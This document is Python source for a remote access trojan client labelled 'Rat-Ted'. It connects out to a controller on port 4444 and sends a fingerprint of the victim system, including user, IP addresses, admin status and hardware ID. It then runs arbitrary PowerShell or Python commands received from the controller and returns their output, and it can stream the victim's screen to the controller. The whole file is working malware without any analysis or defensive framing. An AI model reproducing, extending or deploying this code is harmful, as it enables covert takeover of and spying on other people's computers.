import socket
import subprocess
import os
import platform
from threading import Thread
from datetime import datetime
import ctypes
import psutil
import uuid
from vidstream import ScreenShareClient

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2


class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        self.command_history = []
        self.screen_share_thread = None  # Initialize screen share thread

    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))

        s.send(self.gather_info().encode())

    def gather_info(self):
        info = str(
            f"System:{platform.platform()} {platform.win32_edition()}|Version: {platform.version()}|Architecture:{platform.architecture()}|Name:{platform.node()}|Processor:{platform.processor()}|Python:{platform.python_version()}|User:{os.getlogin()}|IPv4:{socket.gethostbyname(socket.gethostname())}|IPv6:{socket.gethostbyname_ex(socket.gethostname())[2][0]}|Uptime:{datetime.now() - datetime.fromtimestamp(psutil.boot_time())}|Privileges:{ctypes.windll.shell32.IsUserAnAdmin()}|Bit:{platform.machine()}|Rat-Ted-Version:1.0.0|ID:{uuid.getnode()}|Current_Directory:{os.getcwd().replace(':', 'colon')}")

        return info

    def execute(self):
        while True:
            command = s.recv(100024).decode()
            try:
                command = command.split("|", 1)
                command_type = command[0].split("command_type")[
                    1].replace(":", "")
                command_cmd = command[1].split("command")[1].replace(":", "")
                if command_type == "function":
                    output = self.handle_function(command_cmd)
                elif command_type == "python":
                    output = subprocess.check_output(
                        ["python", "-c", command_cmd],
                        stderr=subprocess.STDOUT,
                        shell=True,
                        text=True
                    ).strip()

                else:
                    output = subprocess.check_output(
                        ["powershell.exe", "-Command",
                            command_cmd],
                        stderr=subprocess.STDOUT,
                        shell=True,
                        text=True
                    ).strip()

            except subprocess.CalledProcessError as e:
                output = str(e.output)

            s.send(output.encode())

    def start_screen_share(self):
        try:
            if not self.screen_share_thread or not self.screen_share_thread.is_alive():
                # Start a new screen share thread
                self.screen_share_thread = Thread(
                    target=self.start_screen_share_thread, daemon=True)
                self.screen_share_thread.start()
                return "Screen share started at http://{}:8080".format(self.host)
            else:
                return "Screen share is already running"
        except Exception as e:
            return "Error starting screen share: {}".format(str(e))

    def start_screen_share_thread(self):
        try:
            screen_share_client = ScreenShareClient(self.host, 8080)
            screen_share_client.start_stream()
        except Exception as e:
            print("Error during screen sharing:", str(e))

    def handle_function(self, function_name):
        if (function_name == "screen_share"):
            return self.start_screen_share()
        elif (function_name == "stop_screen_share"):
            return self.stop_screen_share()

    def stop_screen_share(self):
        try:
            if self.screen_share_thread and self.screen_share_thread.is_alive():
                # Stop the screen share thread
                self.screen_share_thread.join()
                return "Screen share stopped"
            else:
                return "Screen share is not running"
        except Exception as e:
            return "Error stopping screen share: {}".format(str(e))


rat = RAT_CLIENT('localhost', 4444)

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()
